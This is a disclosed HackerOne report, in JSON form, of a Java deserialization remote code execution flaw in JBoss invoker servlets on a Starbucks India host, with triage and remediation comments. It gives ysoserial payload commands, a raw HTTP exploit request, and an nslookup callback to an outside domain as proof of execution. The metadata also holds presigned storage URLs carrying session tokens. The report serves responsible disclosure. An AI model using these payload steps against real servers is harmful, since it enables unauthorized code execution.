{"id":153026,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTMwMjY=","url":"https://hackerone.com/reports/153026","title":"Java Deserialization RCE via JBoss JMXInvokerServlet/EJBInvokerServlet on card.starbucks.in","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-07-21T23:04:33.767Z","submitted_at":"2016-07-21T23:04:33.767Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"meals","url":"/meals","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/411/6d37adb1666131d39f36c8e0d715709b7381b052_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1989,"url":"https://hackerone.com/starbucks","handle":"starbucks","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Starbucks","twitter_handle":"Starbucks","website":"http://www.starbucks.com","about":"Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-02-03T22:47:45.617Z","bug_reporter_agreed_on_going_public_at":"2017-01-13T02:45:31.331Z","team_member_agreed_on_going_public_at":"2017-02-03T22:47:45.584Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I found an open JMXInvokerServlet/EJBInvokerServlet and normally I should be able to get a shell just by doing that. However I think due to some egress filtering on the box I've been having issues getting a shell to run.\n\nInvokers: https://card.starbucks.in/invoker/EJBInvokerServlet and https://card.starbucks.in/invoker/JMXInvokerServlet\n\nCommand to output serialized data to a file:\n$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'cmd.exe' \u003e serialdata\n{F106535}\n\nThis puts the serialized data for executing cmd.exe into a file that I can then paste into burp.\n\nCreate a new burp repeater tab and paste in the following (running on https):\n\nPOST /invoker/EJBInvokerServlet HTTP/1.1\nHost: card.starbucks.in\nAccept: */*\nAccept-Language: en\nContentType: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledInvocation\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Length: 0\n\nThen right click an select \"Paste from file\"\n{F106537} \n\nHit Go and our burp repeater tab should look like the following:\n{F106538} \n\nYou will notice I am searching for the string \"cannot find\" in the response tab. If a file is not found on the windows host it will return saying \"The system cannot find the file specified\" as well as another variation of that.  Since the first request is for cmd.exe which IS found on the system this error is not present. This can also be verified by running telnet, ftp, calc.exe.\n\nThe following will produce a \"The system cannot find the file specified\" error:\n$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'fakefile.exe' \u003e serialdata\n\nBurp Output:\n{F106541} \n\n\nThis is proving that files are being run on the system.","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-02-12T02:45:31.363Z","allow_singular_disclosure_after":-147092406.86101645,"singular_disclosure_allowed":true,"vote_count":41,"voters":["derision","sp1d3rs","thaivu","secator","mashoud1122","tk0","b6117130df17feef13481e3","bogdantcaciuc","bl4de","psaux","and 31 more..."],"structured_scope":{"databaseId":12995,"asset_type":"OTHER","asset_identifier":"Other assets","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1081306,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I managed to get access to a DNS server to prove that nslookup commands are being sent.\n$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'nslookup mealstest.demonsec.us' \u003e serialtest\n\nExternal DNS server\n$ sudo tail -f /var/log/messages\n...\n...\nJul 22 00:10:00 server named[7356]: client 180.179.199.50#33347: query: mealstest.demonsec.us IN A -EDC (10.0.5.200)\n\n\n","automated_response":false,"created_at":"2016-07-22T00:18:05.199Z","updated_at":"2016-07-22T00:18:05.199Z","actor":{"username":"meals","cleared":true,"url":"/meals","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/411/6d37adb1666131d39f36c8e0d715709b7381b052_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":106550,"filename":"Screen_Shot_2016-07-21_at_8.17.36_PM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/106/550/292180edc5f6725d39be0ff3948d90c57ad7c90c/Screen_Shot_2016-07-21_at_8.17.36_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2016-07-21_at_8.17.36_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2016-07-21_at_8.17.36_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJIO5LUY%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134538Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJGMEQCIDSzlg00hmiY8SKrGreVtNoMLQjEiCw6t6oEyA%2FsmU%2BXAiBpyUu02MMoiYLrZvREKmQg5iFaXBaQDOAfdsodU%2FdTzyqDBAjt%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMt%2BNu9EHH6F1YrtDrKtcDlxN7DtwGfMbt4FPWDeJ%2Bv9c5rbIcX9cAEEqxJYLzJL7XQby13DWG5FPcm6FyEelS9pS99w608bFzjC3LswJsF3ziB00J0zddGDnpoT1EleYU3VzD3ULK1rar1tG4vFfsR40ftI4fxgz8xygldUPfGmR6yoOKn3s0gewUOGtFb48fR93fy%2BhyDsoMniu93hqO3QsrTYxgXAMOyZYH4KWCax6nWcKcVM97S1TSOm8t9SZ0HgbWWC46ZBj1pAotwtOa4CfLOrRYqmRpEQ4W%2BXz69nDHRZrLiyfHJRB1AfQla3UZmjt27KLWN2H9qRHZ0bgVCnxPnDLifs2wCJG%2FEGhEDB0romYWRi2gNFBtMkZv0GGsq0ZOWswyvgfzoVbJJdTeWGaYGRZo8I8u4pA%2BY4ESQTGVdcUMDVdV%2Bb3JJTvFZY4EkMEQ32hDhw8FFMRAksf7L2TRHc1bldE8HF7rc%2Fj9%2FV2JFNqie6zPYkKlg6yVUO%2Ff0hgwHlvWGpYo%2FB8wnvZIpuQqzfqMbiz9kmutD4jbKXpteFa8z%2BwK3GVY%2FueaXvEW06A3Nb0cHPdu7HPOe71hzSq47V89FBmfHgFBtMypOO%2BW0bmvb9v7eDmUbX7YY%2B%2BMsmyl1tehMMvEkIsGOqYBH3NvJOPeh%2FYCJz529hl3JFXiZ4mIrcvr4pynox0h4Mp1nIPFOWMxUGxA%2FVzT%2BE178l8UQb%2BPYHhLxS5Eirk9gIzgjO%2FbybMlO0U6498Dz8lERZ3gNZVXPq4Pqfzhsb1Cnp4vQTuTTBGNHQUXRg78H56AMeStnoBGp9yuAWo2l5Y3GyRZ0XiMw%2Fi3C2ml9dQKwQ1QZs5b03K5hnqatzca0ZPYcMaJeQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=164d3029996937d79681802c0b3d74017bd9720d54d7bcd02d959f255c63727d"}],"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1083119,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Sean,\n\n1.\tCan you please add more details on step 1? Here is the output I see on my machine in Cygwin prompt. Where do I get the jar file? I tried to search in google and got some details at https://github.com/frohoff/ysoserial, but could not see jar file there too.\n\n$ java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'cmd.exe' \u003e serialdata\nError: Unable to access jarfile ysoserial-0.0.4-all.jar\n\n      2.  I had some success with step 2, but my burp was not showing 'paste from file' in the menu on the Repeater pane.\n\nThanks,\nVerona","automated_response":false,"created_at":"2016-07-22T23:09:02.386Z","updated_at":"2016-07-22T23:09:02.386Z","actor":{"username":"verona","cleared":false,"url":"/verona","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/077/022/43063bc1ec0e6b58d6fed4587f9a16b95a98a916_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":106763,"filename":"step2-burp.JPG","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/106/763/a174647f86d38c5807f2fc3672d71b8cd1901d34/step2-burp.JPG?response-content-disposition=attachment%3B%20filename%3D%22step2-burp.JPG%22%3B%20filename%2A%3DUTF-8%27%27step2-burp.JPG\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRJIO5LUY%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134538Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHQaCXVzLXdlc3QtMiJGMEQCIDSzlg00hmiY8SKrGreVtNoMLQjEiCw6t6oEyA%2FsmU%2BXAiBpyUu02MMoiYLrZvREKmQg5iFaXBaQDOAfdsodU%2FdTzyqDBAjt%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMt%2BNu9EHH6F1YrtDrKtcDlxN7DtwGfMbt4FPWDeJ%2Bv9c5rbIcX9cAEEqxJYLzJL7XQby13DWG5FPcm6FyEelS9pS99w608bFzjC3LswJsF3ziB00J0zddGDnpoT1EleYU3VzD3ULK1rar1tG4vFfsR40ftI4fxgz8xygldUPfGmR6yoOKn3s0gewUOGtFb48fR93fy%2BhyDsoMniu93hqO3QsrTYxgXAMOyZYH4KWCax6nWcKcVM97S1TSOm8t9SZ0HgbWWC46ZBj1pAotwtOa4CfLOrRYqmRpEQ4W%2BXz69nDHRZrLiyfHJRB1AfQla3UZmjt27KLWN2H9qRHZ0bgVCnxPnDLifs2wCJG%2FEGhEDB0romYWRi2gNFBtMkZv0GGsq0ZOWswyvgfzoVbJJdTeWGaYGRZo8I8u4pA%2BY4ESQTGVdcUMDVdV%2Bb3JJTvFZY4EkMEQ32hDhw8FFMRAksf7L2TRHc1bldE8HF7rc%2Fj9%2FV2JFNqie6zPYkKlg6yVUO%2Ff0hgwHlvWGpYo%2FB8wnvZIpuQqzfqMbiz9kmutD4jbKXpteFa8z%2BwK3GVY%2FueaXvEW06A3Nb0cHPdu7HPOe71hzSq47V89FBmfHgFBtMypOO%2BW0bmvb9v7eDmUbX7YY%2B%2BMsmyl1tehMMvEkIsGOqYBH3NvJOPeh%2FYCJz529hl3JFXiZ4mIrcvr4pynox0h4Mp1nIPFOWMxUGxA%2FVzT%2BE178l8UQb%2BPYHhLxS5Eirk9gIzgjO%2FbybMlO0U6498Dz8lERZ3gNZVXPq4Pqfzhsb1Cnp4vQTuTTBGNHQUXRg78H56AMeStnoBGp9yuAWo2l5Y3GyRZ0XiMw%2Fi3C2ml9dQKwQ1QZs5b03K5hnqatzca0ZPYcMaJeQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=303113b2bd2ad1747f4f84fcb02dc0c691373add444f1bef3e69b43c2b6fb454"}],"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1083141,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is the download of the jar file: https://github.com/frohoff/ysoserial/releases/download/v0.0.4/ysoserial-0.0.4-all.jar\n\nIf you go 9 up from what you had selected it says \"paste from file\"\n\n\n","automated_response":false,"created_at":"2016-07-22T23:27:42.257Z","updated_at":"2016-07-22T23:27:42.257Z","actor":{"username":"meals","cleared":true,"url":"/meals","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/411/6d37adb1666131d39f36c8e0d715709b7381b052_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1089355,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Any update on this?","automated_response":false,"created_at":"2016-07-26T20:52:31.074Z","updated_at":"2016-07-26T20:52:31.074Z","actor":{"username":"meals","cleared":true,"url":"/meals","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/411/6d37adb1666131d39f36c8e0d715709b7381b052_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1089668,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Meals,\n\nThanks for your patience. We could reproduce it on our side and notified the market. Do you think disabling the Commons-Collections library by upgrading to version 3.2.2 or 4.1 will mitigate this issue as noted in the article https://www.cigital.com/blog/mitigate-java-deserialization-vulnerability-jboss/? I will let update you on the resolution method soon.\n\nThanks,\nVerona","automated_response":false,"created_at":"2016-07-26T23:38:43.989Z","updated_at":"2016-07-26T23:38:43.989Z","actor":{"username":"verona","cleared":false,"url":"/verona","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/077/022/43063bc1ec0e6b58d6fed4587f9a16b95a98a916_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1089679,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"If the Invokers are not being used I would remove/delete  the .sar or .ear files. Also restricting external access to the JBoss services is a good method. Lastly to patch the java deserialization: updating to the latest JBoss should do the trick.","automated_response":false,"created_at":"2016-07-26T23:46:48.027Z","updated_at":"2016-07-26T23:46:48.027Z","actor":{"username":"meals","cleared":true,"url":"/meals","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/411/6d37adb1666131d39f36c8e0d715709b7381b052_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1113513,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @meals.  This one is unfortunately out of scope for bounty, but it is an interesting find!  The team has a fix prepared in QA and we'll be re-testing soon.","automated_response":false,"created_at":"2016-08-08T20:45:49.463Z","updated_at":"2016-08-08T20:45:49.463Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1202292,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @meals - This one should be resolved.  Can you confirm?","automated_response":false,"created_at":"2016-09-17T22:22:04.391Z","updated_at":"2016-09-17T22:22:04.391Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"meals","url":"/meals"},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1202293,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","automated_response":false,"created_at":"2016-09-17T22:22:20.331Z","updated_at":"2016-09-17T22:22:20.331Z","actor":{"url":"/starbucks","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/989/c9aa38cf3b1a91daa085d31e23d23f34cd1874df_original./fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Starbucks"}},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1417432,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-01-13T02:45:31.347Z","updated_at":"2017-01-13T02:45:31.347Z","first_to_agree":true,"actor":{"username":"meals","cleared":true,"url":"/meals","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/411/6d37adb1666131d39f36c8e0d715709b7381b052_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1461978,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-02-03T22:47:45.599Z","updated_at":"2017-02-03T22:47:45.599Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1461979,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-02-03T22:47:45.630Z","updated_at":"2017-02-03T22:47:45.630Z","actor":{"username":"siren","cleared":false,"url":"/siren","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/043/496/422aa228af5a54db16d191c4bed22c984a6429f2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3163614,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2018-08-08T23:29:15.694Z","updated_at":"2018-08-08T23:29:15.694Z","actor":{"username":"tealeaf","cleared":false,"url":"/tealeaf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/288/393/1ac76d5540516a68330a902a1d125dbebfdc2258_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"None","new_scope":"Other assets","genius_execution_id":null,"team_handle":"starbucks","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}